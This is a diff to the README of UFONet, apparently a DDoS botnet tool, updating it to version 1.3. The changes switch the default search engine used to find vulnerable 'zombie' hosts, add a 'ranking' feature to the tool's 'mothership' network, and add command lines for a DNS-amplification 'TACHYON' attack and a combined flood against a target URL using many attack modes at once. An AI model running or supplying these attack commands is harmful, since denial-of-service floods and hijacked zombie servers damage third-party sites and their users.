@@ -62,7 +62,7 @@ UFONet runs on many platforms. It requires Python (>2.7.9) and the following lib
 
 You can automatically get all required libraries using:
 
-     python setup.py install
+     sudo python setup.py install
 
 For manual installation on Debian-based systems (ex: Ubuntu), run: 
 
@@ -106,14 +106,16 @@ Or providing a list of "dorks" from a file:
 
        ./ufonet --sd 'botnet/dorks.txt'
 
-By default UFONet will use a search engine called 'Yahoo'. But you can choose a different one:
+By default UFONet will use a search engine called 'StartPage'. But you can choose a different one:
 
        ./ufonet -s 'proxy.php?url=' --se 'bing'
 
 This is the list of available search engines with last time that they were working:
 
-        - bing  [30/12/2018: OK!]
-        - yahoo [30/12/2018: OK!]
+        - startpage  [06/03/2019: OK!]
+        - duckduckgo [06/03/2019: OK!]
+        - bing       [06/03/2019: OK!]
+        - yahoo      [06/03/2019: OK!]
 
 You can also search massively using all search engines supported:
 
@@ -364,11 +366,15 @@ minimum level of protection:
 
      sudo python ufonet -a http://target.com --nuke 10000
 
+Or a TACHYON ('root' required) attack to perform a distributed amplification of DNS traffic:
+
+     sudo python ufonet -a http://target.com --tachyon 1000
+
 All ways could be combined, so UFONet can attack DDoS and DoS, at the same time:
 
      python ufonet -a http://target.com --loic 100 --loris 100
 
-     sudo python ufonet -a http://target.com --loic 100 --loris 100 --ufosyn 100 --spray 100 --smurf 101 --xmas 101 --nuke 10000
+     sudo python ufonet -a http://target.com --loic 100 --loris 100 --ufosyn 100 --spray 100 --smurf 101 --xmas 101 --nuke 10000 --tachyon 1000
 
 ###############################
 # Updating
@@ -423,6 +429,7 @@ This will open a tab on your default browser with all features of the tool and s
  - NEWS: Allows to read last "news" published by a "mothership"
  - MISSIONS: Allows to read last "missions" published by a "mothership"
  - SHIP STATS: Allows to review statistics from your "spaceship"
+ - RANKING: Allows to check your "ranking" position
  - BOARD: Allows to send/receive messages to/from a "mothership" (a forum)
  - WARPS: Allows to interact with a "mothership" to download/upload "zombies"
  - GLOBAL GRID: Allows to review statistics from other "spaceships"
@@ -431,6 +438,10 @@ This will open a tab on your default browser with all features of the tool and s
 ###############################
 # Timelog
 ###############################
+
+--------------------------
+10.03.2019 : v.1.3
+--------------------------
 
 --------------------------
 03.02.2019 : v.1.2.1
